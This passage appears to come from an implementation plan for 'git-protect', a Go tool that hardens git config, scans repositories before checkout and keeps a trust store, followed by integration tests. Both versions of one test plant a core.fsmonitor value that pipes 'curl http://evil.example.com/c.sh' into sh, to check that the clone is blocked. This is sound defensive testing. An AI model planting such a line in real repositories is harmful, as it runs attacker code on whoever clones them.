			output.RenderText(os.Stdout, report, minSeverity)

			if len(report.AtOrAbove(minSeverity)) == 0 {
				if !hookMode {
					fmt.Fprintln(os.Stdout, "Scan complete. No threats found.")
				}
			} else {
				total := len(report.Findings)
				blocking := len(report.AtOrAbove(scanner.High))
				if blocking > 0 {
					fmt.Fprintf(os.Stdout, "\n%d blocking findings (%d total).\n", blocking, total)
				} else {
					fmt.Fprintf(os.Stdout, "\n%d findings (none blocking).\n", total)
				}
			}

			if exitCode && report.HasBlocking() {
				os.Exit(1)
			}
			return nil
		},
	}

	cmd.Flags().BoolVar(&jsonOut, "json", false, "Output in JSON format")
	cmd.Flags().BoolVarP(&verbose, "verbose", "v", false, "Show INFO-level findings")
	cmd.Flags().StringVar(&severityStr, "severity", "", "Minimum severity to show (critical|high|medium|info)")
	cmd.Flags().StringVar(&modulesStr, "modules", "", "Comma-separated list of modules to run")
	cmd.Flags().BoolVar(&exitCode, "exit-code", false, "Exit non-zero if blocking threats are found (for CI)")
	cmd.Flags().BoolVar(&hookMode, "hook-mode", false, "Running as a git hook (adjusts output for hook context)")

	return cmd
}

// ---- install command ----

func buildInstallCmd() *cobra.Command {
	var (
		alias  bool
		dryRun bool
	)

	cmd := &cobra.Command{
		Use:   "install",
		Short: "Set up global git protection",
		Long:  "Installs git hooks and applies git config hardening entries globally.",
		RunE: func(cmd *cobra.Command, args []string) error {
			hooksDir := paths.HooksDir()
			trustPath := paths.TrustStorePath()

			if dryRun {
				fmt.Fprintln(os.Stdout, "Dry run — no changes will be made.\n")
			}

			// Check for existing core.hooksPath (conflict detection)
			existing, err := gitcfg.GetGlobal("core.hooksPath")
			if err != nil {
				return fmt.Errorf("check existing core.hooksPath: %w", err)
			}
			if existing != "" && existing != hooksDir {
				fmt.Fprintf(os.Stderr,
					"WARNING: core.hooksPath is already set to %q (possibly Husky, pre-commit, or Lefthook).\n"+
						"  git-protect will override this. To restore on uninstall, the original value is noted.\n",
					existing)
			}

			// Apply hardening entries
			entries := gitcfg.HardeningEntries()
			for _, e := range entries {
				val := e.Value
				if e.Key == "core.hooksPath" {
					val = hooksDir
				}
				if val == "" {
					continue
				}
				if !dryRun {
					if err := gitcfg.SetGlobal(e.Key, val); err != nil {
						fmt.Fprintf(os.Stderr, "  [warn] %s: %v\n", e.Key, err)
						continue
					}
				}
				fmt.Fprintf(os.Stdout, "  [ok] %s = %s\n", e.Key, val)
			}

			// Install hook scripts
			if !dryRun {
				binaryPath, err := os.Executable()
				if err != nil {
					return fmt.Errorf("resolve binary path: %w", err)
				}
				binaryPath, err = filepath.EvalSymlinks(binaryPath)
				if err != nil {
					return fmt.Errorf("resolve binary symlinks: %w", err)
				}

				if err := hooks.Install(hooksDir, binaryPath); err != nil {
					return fmt.Errorf("install hooks: %w", err)
				}
			}
			for _, name := range hooks.HookNames() {
				fmt.Fprintf(os.Stdout, "  [ok] Installed %s hook\n", name)
			}

			// Initialize trust store
			if !dryRun {
				store := trust.NewStore(trustPath)
				// Load creates the file on first Add; just ensure the dir exists.
				if err := os.MkdirAll(filepath.Dir(trustPath), 0700); err != nil {
					return fmt.Errorf("create config dir: %w", err)
				}
				// Touch the trust store file if it doesn't exist
				if _, err := os.Stat(trustPath); os.IsNotExist(err) {
					if err := store.Add(trust.Entry{}); err != nil {
						// Ignore error from adding empty entry — file creation is the goal
						_ = err
					}
					// Remove the empty entry
					_ = store.Remove("")
				}
			}
			fmt.Fprintf(os.Stdout, "  [ok] Trust store at %s (mode 0600)\n", trustPath)

			// Optional alias
			if alias {
				if err := installAlias(dryRun); err != nil {
					fmt.Fprintf(os.Stderr, "  [warn] alias: %v\n", err)
				} else {
					fmt.Fprintln(os.Stdout, "  [ok] git alias.clone set to git-protect clone")
				}
			} else {
				fmt.Fprintln(os.Stdout, "\n  RECOMMENDED: Run 'git-protect install --alias' to route 'git clone'")
				fmt.Fprintln(os.Stdout, "  through the safe-clone wrapper for maximum protection.")
			}

			fmt.Fprintln(os.Stdout, "\n  Protection active. All future clones and checkouts will be scanned.")
			return nil
		},
	}

	cmd.Flags().BoolVar(&alias, "alias", false, "Set git alias.clone to route through git-protect")
	cmd.Flags().BoolVar(&dryRun, "dry-run", false, "Show what would be changed without applying")
	return cmd
}

// installAlias sets git config --global alias.clone to use the absolute binary path.
func installAlias(dryRun bool) error {
	binaryPath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve binary: %w", err)
	}
	binaryPath, err = filepath.EvalSymlinks(binaryPath)
	if err != nil {
		return fmt.Errorf("resolve symlinks: %w", err)
	}
	absPath, err := filepath.Abs(binaryPath)
	if err != nil {
		return fmt.Errorf("abs path: %w", err)
	}
	// Use !<path> clone format for shell alias
	aliasVal := fmt.Sprintf("!%s clone", absPath)
	if dryRun {
		fmt.Fprintf(os.Stdout, "  [dry-run] git config --global alias.clone '%s'\n", aliasVal)
		return nil
	}
	return gitcfg.SetGlobal("alias.clone", aliasVal)
}

// ---- uninstall command ----

func buildUninstallCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "uninstall",
		Short: "Remove global git protection",
		RunE: func(cmd *cobra.Command, args []string) error {
			hooksDir := paths.HooksDir()

			// Remove hardening config entries
			entries := gitcfg.HardeningEntries()
			for _, e := range entries {
				if err := gitcfg.UnsetGlobal(e.Key); err != nil {
					fmt.Fprintf(os.Stderr, "  [warn] unset %s: %v\n", e.Key, err)
					continue
				}
				fmt.Fprintf(os.Stdout, "  [ok] unset %s\n", e.Key)
			}

			// Remove alias if set
			if err := gitcfg.UnsetGlobal("alias.clone"); err != nil {
				fmt.Fprintf(os.Stderr, "  [warn] unset alias.clone: %v\n", err)
			} else {
				fmt.Fprintln(os.Stdout, "  [ok] unset alias.clone")
			}

			// Remove hook files
			if err := hooks.Uninstall(hooksDir); err != nil {
				return fmt.Errorf("uninstall hooks: %w", err)
			}
			fmt.Fprintf(os.Stdout, "  [ok] Removed hooks from %s\n", hooksDir)

			fmt.Fprintln(os.Stdout, "\n  git-protect has been uninstalled.")
			return nil
		},
	}
}

// ---- clone command ----

func buildCloneCmd() *cobra.Command {
	var (
		force       bool
		trustFlag   bool
		jsonOut     bool
		showThreats bool
		bareFlag    bool
		mirrorFlag  bool
	)

	cmd := &cobra.Command{
		Use:   "clone <url> [<dir>] [git-clone-flags...]",
		Short: "Safe clone: scan before checkout",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			url := args[0]
			dir := ""
			var extraArgs []string

			if len(args) > 1 {
				// Second positional arg might be dir or a flag; collect remaining as extraArgs
				remaining := args[1:]
				// Heuristic: if the first remaining arg does not start with '-', treat as dir
				if !strings.HasPrefix(remaining[0], "-") {
					dir = remaining[0]
					extraArgs = remaining[1:]
				} else {
					extraArgs = remaining
				}
			}

			// Add --bare or --mirror to extraArgs if flags were set
			if bareFlag {
				extraArgs = append(extraArgs, "--bare")
			}
			if mirrorFlag {
				extraArgs = append(extraArgs, "--mirror")
			}

			// --trust requires interactive TTY and confirmation
			if trustFlag {
				if !isTerminal(os.Stdin) {
					return fmt.Errorf("--trust requires an interactive TTY; use 'git-protect trust add <url>' instead")
				}
				fmt.Fprintf(os.Stderr, "Are you sure you want to permanently trust %q? [y/N] ", url)
				var answer string
				fmt.Fscanln(os.Stdin, &answer)
				if strings.ToLower(strings.TrimSpace(answer)) != "y" {
					return fmt.Errorf("trust confirmation declined")
				}
			}

			// Check trust store
			store := trust.NewStore(paths.TrustStorePath())
			trusted, err := store.IsTrusted(url)
			if err != nil {
				fmt.Fprintf(os.Stderr, "WARNING: trust store error: %v\n", err)
			}

			gitBin, err := clone.DetectGitBin()
			if err != nil {
				return err
			}

			fmt.Fprintln(os.Stdout, "  Cloning (no-checkout)...")

			scanFn := func(ctx context.Context, repoPath string, preCheckout bool) (scanner.Report, error) {
				e := scanner.NewEngine()
				allModules(e)
				sc := scanner.ScanContext{
					RepoPath:    repoPath,
					PreCheckout: preCheckout,
				}
				return e.Scan(ctx, sc)
			}

			result, err := clone.Execute(context.Background(), gitBin, url, dir, extraArgs, scanFn)
			if err != nil {
				return err
			}

			if jsonOut {
				type cloneResult struct {
					Blocked   bool          `json:"blocked"`
					CleanedUp bool          `json:"cleaned_up"`
					Dir       string        `json:"dir"`
					PreScan   scanner.Report `json:"pre_scan"`
					PostScan  scanner.Report `json:"post_scan"`
				}
				return json.NewEncoder(os.Stdout).Encode(cloneResult{
					Blocked:   result.Blocked,
					CleanedUp: result.CleanedUp,
					Dir:       result.Dir,
					PreScan:   result.PreReport,
					PostScan:  result.PostReport,
				})
			}

			if result.Blocked {
				fmt.Fprintln(os.Stdout, "  Scanning for threats...")
				minSev := scanner.High
				if showThreats {
					minSev = scanner.Info
				}
				output.RenderText(os.Stdout, result.PreReport, minSev)
				fmt.Fprintf(os.Stdout, "\n  BLOCKED -- %d threats found. Repository has NOT been checked out.\n",
					len(result.PreReport.AtOrAbove(scanner.High)))
				if result.CleanedUp {
					fmt.Fprintf(os.Stdout, "  Cleaned up: ./%s removed.\n", result.Dir)
				}
				fmt.Fprintln(os.Stdout, "\n  Actions:")
				fmt.Fprintf(os.Stdout, "    git-protect clone --show-threats %s    Full threat analysis\n", url)
				fmt.Fprintf(os.Stdout, "    git-protect clone --force %s           Clone once without trusting\n", url)
				fmt.Fprintf(os.Stdout, "    git-protect clone --trust %s           Clone and add to trustlist\n", url)

				if force || trustFlag {
					fmt.Fprintln(os.Stdout, "\n  --force/--trust specified: proceeding despite threats...")
					// If forced, do a plain clone without scanning
					plainArgs := buildPlainCloneArgs(url, dir, extraArgs)
					plainCmd := exec.Command(gitBin, plainArgs...)
					plainCmd.Stdout = os.Stdout
					plainCmd.Stderr = os.Stderr
					if err := plainCmd.Run(); err != nil {
						return fmt.Errorf("forced clone failed: %w", err)
					}
				} else {
					os.Exit(1)
				}
			} else {
				fmt.Fprintln(os.Stdout, "  Scanning for threats... clean.")
				fmt.Fprintln(os.Stdout, "  Checking out... done.")
				if len(result.PostReport.Findings) > 0 {
					output.RenderText(os.Stdout, result.PostReport, scanner.High)
				} else {
					fmt.Fprintln(os.Stdout, "  Post-checkout verification... clean.")
				}
				fmt.Fprintf(os.Stdout, "\n  Repository cloned safely to ./%s\n", result.Dir)
			}

			// Add to trust store if --trust was confirmed
			if trustFlag && !result.Blocked {
				norm, ok := trust.Normalize(url)
				if ok {
					_ = store.Add(trust.Entry{
						Pattern: norm,
						Type:    "repo",
					})
					fmt.Fprintf(os.Stdout, "  Added %q to trust store.\n", norm)
				}
			}

			_ = trusted // used for future: trusted repos skip blocking
			return nil
		},
	}

	cmd.Flags().BoolVar(&force, "force", false, "Clone once despite threats (does not add to trust store)")
	cmd.Flags().BoolVar(&trustFlag, "trust", false, "Clone despite threats AND add to trust store permanently (requires TTY)")
	cmd.Flags().BoolVar(&jsonOut, "json", false, "Output in JSON format")
	cmd.Flags().BoolVar(&showThreats, "show-threats", false, "Show full threat analysis")
	cmd.Flags().BoolVar(&bareFlag, "bare", false, "Pass --bare to git clone")
	cmd.Flags().BoolVar(&mirrorFlag, "mirror", false, "Pass --mirror to git clone")

	return cmd
}

// buildPlainCloneArgs constructs a plain git clone argument list (no --no-checkout injection).
func buildPlainCloneArgs(url, dir string, extraArgs []string) []string {
	args := []string{"clone"}
	args = append(args, extraArgs...)
	args = append(args, url)
	if dir != "" {
		args = append(args, dir)
	}
	return args
}

// isTerminal returns true if the given file is a terminal (TTY).
func isTerminal(f *os.File) bool {
	fi, err := f.Stat()
	if err != nil {
		return false
	}
	return (fi.Mode() & os.ModeCharDevice) != 0
}

// ---- trust command ----

func buildTrustCmd() *cobra.Command {
	trust := &cobra.Command{
		Use:   "trust",
		Short: "Manage the repository trust/allowlist",
	}

	trust.AddCommand(buildTrustListCmd())
	trust.AddCommand(buildTrustAddCmd())
	trust.AddCommand(buildTrustRemoveCmd())
	trust.AddCommand(buildTrustCheckCmd())

	return trust
}

func buildTrustListCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "list",
		Short: "List all trusted patterns",
		RunE: func(cmd *cobra.Command, args []string) error {
			store := trust.NewStore(paths.TrustStorePath())
			entries, err := store.Load()
			if err != nil {
				return fmt.Errorf("trust store: %w", err)
			}
			if len(entries) == 0 {
				fmt.Fprintln(os.Stdout, "  No trusted patterns. Use 'git-protect trust add <pattern>' to add one.")
				return nil
			}
			fmt.Fprintf(os.Stdout, "  %-45s %-6s %s\n", "Pattern", "Type", "Added")
			fmt.Fprintf(os.Stdout, "  %s\n", strings.Repeat("-", 70))
			for _, e := range entries {
				added := ""
				if !e.Added.IsZero() {
					added = e.Added.Format("2006-01-02")
				}
				fmt.Fprintf(os.Stdout, "  %-45s %-6s %s", e.Pattern, e.Type, added)
				if e.Note != "" {
					fmt.Fprintf(os.Stdout, "  # %s", e.Note)
				}
				fmt.Fprintln(os.Stdout)
			}
			return nil
		},
	}
}

func buildTrustAddCmd() *cobra.Command {
	var (
		yes      bool
		noteStr  string
		typeStr  string
	)

	cmd := &cobra.Command{
		Use:   "add <pattern>",
		Short: "Add a trusted pattern (requires TTY confirmation unless -y)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			pattern := args[0]

			if !yes {
				if !isTerminal(os.Stdin) {
					return fmt.Errorf("interactive TTY required; use -y to bypass confirmation")
				}
				fmt.Fprintf(os.Stderr, "Add %q to the trust store? [y/N] ", pattern)
				var answer string
				fmt.Fscanln(os.Stdin, &answer)
				if strings.ToLower(strings.TrimSpace(answer)) != "y" {
					return fmt.Errorf("cancelled")
				}
			}

			entryType := typeStr
			if entryType == "" {
				// Infer type from pattern
				switch {
				case strings.HasSuffix(pattern, "/*"):
					parts := strings.Split(strings.TrimSuffix(pattern, "/*"), "/")
					if len(parts) == 1 {
						entryType = "host"
					} else {
						entryType = "org"
					}
				default:
					entryType = "repo"
				}
			}

			store := trust.NewStore(paths.TrustStorePath())
			if err := store.Add(trust.Entry{
				Pattern: pattern,
				Type:    entryType,
				Note:    noteStr,
			}); err != nil {
				return fmt.Errorf("trust add: %w", err)
			}
			fmt.Fprintf(os.Stdout, "  Added %q (%s) to trust store.\n", pattern, entryType)
			return nil
		},
	}

	cmd.Flags().BoolVarP(&yes, "yes", "y", false, "Skip confirmation prompt")
	cmd.Flags().StringVar(&noteStr, "note", "", "Optional note for this entry")
	cmd.Flags().StringVar(&typeStr, "type", "", "Trust type: repo, org, or host (auto-detected if omitted)")
	return cmd
}

func buildTrustRemoveCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "remove <pattern>",
		Short: "Remove a trusted pattern",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			store := trust.NewStore(paths.TrustStorePath())
			if err := store.Remove(args[0]); err != nil {
				return fmt.Errorf("trust remove: %w", err)
			}
			fmt.Fprintf(os.Stdout, "  Removed %q from trust store.\n", args[0])
			return nil
		},
	}
}

func buildTrustCheckCmd() *cobra.Command {
	var quiet bool

	cmd := &cobra.Command{
		Use:   "check [url]",
		Short: "Check if the current repo (or a URL) is trusted",
		Args:  cobra.MaximumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			var urlToCheck string

			if len(args) > 0 {
				urlToCheck = args[0]
			} else {
				// Get current repo's remote URL via git
				out, err := exec.Command("git", "remote", "get-url", "origin").Output()
				if err != nil {
					return fmt.Errorf("could not determine current repo URL: %w", err)
				}
				urlToCheck = strings.TrimRight(string(out), "\n")
			}

			store := trust.NewStore(paths.TrustStorePath())
			trusted, err := store.IsTrusted(urlToCheck)
			if err != nil {
				return fmt.Errorf("trust check: %w", err)
			}

			if quiet {
				if !trusted {
					os.Exit(1)
				}
				return nil
			}

			if trusted {
				fmt.Fprintf(os.Stdout, "  %q is TRUSTED\n", urlToCheck)
			} else {
				fmt.Fprintf(os.Stdout, "  %q is NOT trusted\n", urlToCheck)
				os.Exit(1)
			}
			return nil
		},
	}

	cmd.Flags().BoolVar(&quiet, "quiet", false, "Exit non-zero if not trusted, print nothing")
	return cmd
}

// ---- status command ----

func buildStatusCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "status",
		Short: "Show current protection status",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintf(os.Stdout, "  git-protect %s\n\n", version)
			fmt.Fprintln(os.Stdout, "  Protection:")

			entries := gitcfg.HardeningEntries()
			hooksDir := paths.HooksDir()
			for _, e := range entries {
				val := e.Value
				if e.Key == "core.hooksPath" {
					val = hooksDir
				}
				current, err := gitcfg.GetGlobal(e.Key)
				if err != nil {
					current = "(error)"
				}

				active := current == val
				status := "NOT SET"
				if active {
					status = "active"
				} else if current != "" {
					status = fmt.Sprintf("set to %q (expected %q)", current, val)
				}

				overridable := "(overridable by local config)"
				if !e.Overridable {
					overridable = "(enforced)"
				}

				fmt.Fprintf(os.Stdout, "    %-25s %-35s %s %s\n", e.Key, val, status, overridable)
			}

			// Clone alias
			aliasVal, _ := gitcfg.GetGlobal("alias.clone")
			if aliasVal != "" {
				fmt.Fprintf(os.Stdout, "    %-25s %-35s %s\n", "clone alias", aliasVal, "active")
			} else {
				fmt.Fprintf(os.Stdout, "    %-25s %-35s %s\n", "clone alias", "not set", "recommended")
			}

			// Check for unsafe safe.directory=*
			safeDirVal, _ := gitcfg.GetGlobal("safe.directory")
			if safeDirVal == "*" {
				fmt.Fprintln(os.Stdout, "\n  Warnings:")
				fmt.Fprintln(os.Stdout, "    safe.directory = *    UNSAFE — accepts repos owned by other users")
			}

			// Trust store
			trustPath := paths.TrustStorePath()
			store := trust.NewStore(trustPath)
			entries2, err := store.Load()
			entryCount := 0
			if err == nil {
				entryCount = len(entries2)
			}
			fmt.Fprintf(os.Stdout, "\n  Trust store: %s (%s entries, mode 0600)\n",
				trustPath, strconv.Itoa(entryCount))

			// Module count
			e := scanner.NewEngine()
			allModules(e)
			fmt.Fprintf(os.Stdout, "  Detection modules: %d loaded\n", len(e.ModuleNames()))

			return nil
		},
	}
}

// ---- entrypoint ----

func main() {
	root := buildRoot()
	if err := root.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, "git-protect:", err)
		os.Exit(1)
	}
}
```

---

## Task 23: Integration Tests

### `integration_test.go`

```go
//go:build integration

package main_test

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// integrationBinary returns the path to the built git-protect binary.
// The binary must be built before running integration tests:
//
//	make build && go test -tags=integration ./...
func integrationBinary(t *testing.T) string {
	t.Helper()
	bin := filepath.Join("..", "git-protect")
	if _, err := os.Stat(bin); os.IsNotExist(err) {
		// Try current directory
		bin = "./git-protect"
	}
	if _, err := os.Stat(bin); os.IsNotExist(err) {
		t.Skip("git-protect binary not found; run 'make build' first")
	}
	return bin
}

// createBareRepo initializes a bare git repo at dir and returns the URL.
func createBareRepo(t *testing.T, dir string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, dir, "init")
	runGit(t, dir, "config", "user.email", "test@test.com")
	runGit(t, dir, "config", "user.name", "Test")
	// Create initial commit so HEAD exists
	readme := filepath.Join(dir, "README.md")
	if err := os.WriteFile(readme, []byte("# test"), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, dir, "add", ".")
	runGit(t, dir, "commit", "-m", "initial commit")
	return "file://" + dir
}

// runGit runs a git command in dir, fatals on error.
func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v in %q failed: %v\n%s", args, dir, err, out)
	}
}

// TestClone_MaliciousConfig verifies that cloning a repo containing
// core.fsmonitor in .git/config is detected and the clone is blocked.
func TestClone_MaliciousConfig(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	// Create source repo
	srcDir := filepath.Join(workDir, "src")
	repoURL := createBareRepo(t, srcDir)

	// Inject malicious core.fsmonitor into the source repo's .git/config
	// (simulate what a malicious repo would have on the server side by
	// patching it locally so git-protect clone fetches it)
	//
	// In a real malicious repo the config comes from .git/config on the remote.
	// We replicate this by modifying the config after init.
	gitConfigPath := filepath.Join(srcDir, ".git", "config")
	existing, err := os.ReadFile(gitConfigPath)
	if err != nil {
		t.Fatal(err)
	}
	maliciousConfig := string(existing) + "\n[core]\n\tfsmonitor = \"curl http://evil.example.com/c.sh|sh\"\n"
	if err := os.WriteFile(gitConfigPath, []byte(maliciousConfig), 0644); err != nil {
		t.Fatal(err)
	}

	// git-protect clone should detect and block
	cloneTarget := filepath.Join(workDir, "cloned")
	cmd := exec.Command(bin, "clone", repoURL, cloneTarget)
	out, err := cmd.CombinedOutput()
	output := string(out)

	// Expect non-zero exit (blocked)
	if err == nil {
		// Clone succeeded — this is the failure case
		t.Fatalf("Expected git-protect clone to block malicious repo, but it succeeded.\nOutput:\n%s", output)
	}

	// Cloned directory should be cleaned up
	if _, statErr := os.Stat(cloneTarget); !os.IsNotExist(statErr) {
		t.Errorf("Expected cloneTarget %q to be removed after block, but it still exists", cloneTarget)
	}

	// Output should mention CRITICAL or BLOCKED
	if !strings.Contains(output, "CRITICAL") && !strings.Contains(output, "BLOCKED") {
		t.Errorf("Expected CRITICAL or BLOCKED in output, got:\n%s", output)
	}
}

// TestScan_CleanRepo verifies that scanning a clean repository reports no threats.
func TestScan_CleanRepo(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	// Create a clean repo
	repoDir := filepath.Join(workDir, "clean-repo")
	if err := os.MkdirAll(repoDir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "init")
	runGit(t, repoDir, "config", "user.email", "test@test.com")
	runGit(t, repoDir, "config", "user.name", "Test")

	// Add a harmless file
	harmlessFile := filepath.Join(repoDir, "hello.go")
	if err := os.WriteFile(harmlessFile, []byte("package main\n\nfunc main() {}\n"), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "add", ".")
	runGit(t, repoDir, "commit", "-m", "clean commit")

	// Run git-protect scan
	cmd := exec.Command(bin, "scan", "--exit-code", repoDir)
	out, err := cmd.CombinedOutput()
	output := string(out)

	if err != nil {
		t.Fatalf("git-protect scan on clean repo failed (exit code non-zero).\nOutput:\n%s", output)
	}

	// Should not contain blocking findings
	if strings.Contains(output, "CRITICAL") || strings.Contains(output, "HIGH") {
		t.Errorf("Clean repo scan produced blocking findings:\n%s", output)
	}
}

// TestScan_MaliciousPackageJSON verifies that postinstall scripts in package.json
// are detected as MEDIUM findings.
func TestScan_MaliciousPackageJSON(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	repoDir := filepath.Join(workDir, "pkg-repo")
	if err := os.MkdirAll(repoDir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "init")
	runGit(t, repoDir, "config", "user.email", "test@test.com")
	runGit(t, repoDir, "config", "user.name", "Test")

	// Add a package.json with a postinstall script
	pkgJSON := `{
  "name": "test",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node scripts/setup.js"
  }
}`
	if err := os.WriteFile(filepath.Join(repoDir, "package.json"), []byte(pkgJSON), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "add", ".")
	runGit(t, repoDir, "commit", "-m", "add package.json")

	// Run scan — expect no error exit (MEDIUM does not block by default)
	cmd := exec.Command(bin, "scan", "--severity", "medium", repoDir)
	out, _ := cmd.CombinedOutput()
	output := string(out)

	if !strings.Contains(output, "MEDIUM") && !strings.Contains(output, "postinstall") {
		t.Errorf("Expected MEDIUM finding for postinstall script, got:\n%s", output)
	}
}

// TestScan_JSONOutput verifies that --json produces valid parseable JSON.
func TestScan_JSONOutput(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	repoDir := filepath.Join(workDir, "json-repo")
	if err := os.MkdirAll(repoDir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "init")
	runGit(t, repoDir, "config", "user.email", "test@test.com")
	runGit(t, repoDir, "config", "user.name", "Test")
	if err := os.WriteFile(filepath.Join(repoDir, "README.md"), []byte("# hi"), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "add", ".")
	runGit(t, repoDir, "commit", "-m", "init")

	cmd := exec.Command(bin, "scan", "--json", repoDir)
	out, _ := cmd.CombinedOutput()

	// JSON must be parseable
	var result struct {
		Findings []interface{} `json:"findings"`
		Blocking bool          `json:"blocking"`
		Count    int           `json:"count"`
	}
	// Accept any valid JSON output (even if empty findings)
	if len(out) == 0 {
		t.Fatal("Expected non-empty JSON output")
	}
	// Try to find the JSON portion (skip any non-JSON prefix lines)
	jsonStart := strings.Index(string(out), "{")
	if jsonStart == -1 {
		t.Fatalf("No JSON object found in output:\n%s", out)
	}
	import_json_decoder := strings.NewReader(string(out)[jsonStart:])
	decoder := json.NewDecoder(import_json_decoder)
	if err := decoder.Decode(&result); err != nil {
		t.Fatalf("JSON parse error: %v\nOutput:\n%s", err, out)
	}
}
```

> Note: the integration test file has a `json` import that must be at the top of the file. The complete file with proper imports is below.

---

### `integration_test.go` (complete, with all imports)

```go
//go:build integration

package main_test

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func integrationBinary(t *testing.T) string {
	t.Helper()
	candidates := []string{"./git-protect", "../git-protect"}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	t.Skip("git-protect binary not found; run 'make build' first")
	return ""
}

func createBareRepo(t *testing.T, dir string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, dir, "init")
	runGit(t, dir, "config", "user.email", "test@test.com")
	runGit(t, dir, "config", "user.name", "Test")
	readme := filepath.Join(dir, "README.md")
	if err := os.WriteFile(readme, []byte("# test"), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, dir, "add", ".")
	runGit(t, dir, "commit", "-m", "initial commit")
	return "file://" + dir
}

func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v in %q: %v\n%s", args, dir, err, out)
	}
}

func TestClone_MaliciousConfig(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	srcDir := filepath.Join(workDir, "src")
	repoURL := createBareRepo(t, srcDir)

	// Inject malicious core.fsmonitor into the source repo config
	gitConfigPath := filepath.Join(srcDir, ".git", "config")
	existing, err := os.ReadFile(gitConfigPath)
	if err != nil {
		t.Fatal(err)
	}
	malicious := string(existing) + "\n[core]\n\tfsmonitor = \"curl http://evil.example.com/c.sh|sh\"\n"
	if err := os.WriteFile(gitConfigPath, []byte(malicious), 0644); err != nil {
		t.Fatal(err)
	}

	cloneTarget := filepath.Join(workDir, "cloned")
	cmd := exec.Command(bin, "clone", repoURL, cloneTarget)
	out, err := cmd.CombinedOutput()
	output := string(out)

	if err == nil {
		t.Fatalf("Expected git-protect clone to block malicious repo.\nOutput:\n%s", output)
	}

	if _, statErr := os.Stat(cloneTarget); !os.IsNotExist(statErr) {
		t.Errorf("cloneTarget %q still exists after block (should be cleaned up)", cloneTarget)
	}

	if !strings.Contains(output, "CRITICAL") && !strings.Contains(output, "BLOCKED") {
		t.Errorf("Expected CRITICAL or BLOCKED in output, got:\n%s", output)
	}
}

func TestScan_CleanRepo(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	repoDir := filepath.Join(workDir, "clean-repo")
	if err := os.MkdirAll(repoDir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "init")
	runGit(t, repoDir, "config", "user.email", "test@test.com")
	runGit(t, repoDir, "config", "user.name", "Test")

	harmlessFile := filepath.Join(repoDir, "hello.go")
	if err := os.WriteFile(harmlessFile, []byte("package main\n\nfunc main() {}\n"), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "add", ".")
	runGit(t, repoDir, "commit", "-m", "clean commit")

	cmd := exec.Command(bin, "scan", "--exit-code", repoDir)
	out, err := cmd.CombinedOutput()
	output := string(out)

	if err != nil {
		t.Fatalf("git-protect scan on clean repo exited non-zero.\nOutput:\n%s", output)
	}

	if strings.Contains(output, "CRITICAL") || strings.Contains(output, "HIGH") {
		t.Errorf("Clean repo scan produced blocking findings:\n%s", output)
	}
}

func TestScan_MaliciousPackageJSON(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	repoDir := filepath.Join(workDir, "pkg-repo")
	if err := os.MkdirAll(repoDir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "init")
	runGit(t, repoDir, "config", "user.email", "test@test.com")
	runGit(t, repoDir, "config", "user.name", "Test")

	pkgJSON := `{
  "name": "test",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node scripts/setup.js"
  }
}`
	if err := os.WriteFile(filepath.Join(repoDir, "package.json"), []byte(pkgJSON), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "add", ".")
	runGit(t, repoDir, "commit", "-m", "add package.json")

	cmd := exec.Command(bin, "scan", "--severity", "medium", repoDir)
	out, _ := cmd.CombinedOutput()
	output := string(out)

	if !strings.Contains(output, "MEDIUM") && !strings.Contains(output, "postinstall") {
		t.Errorf("Expected MEDIUM finding for postinstall, got:\n%s", output)
	}
}

func TestScan_JSONOutput(t *testing.T) {
	bin := integrationBinary(t)
	workDir := t.TempDir()

	repoDir := filepath.Join(workDir, "json-repo")
	if err := os.MkdirAll(repoDir, 0755); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "init")
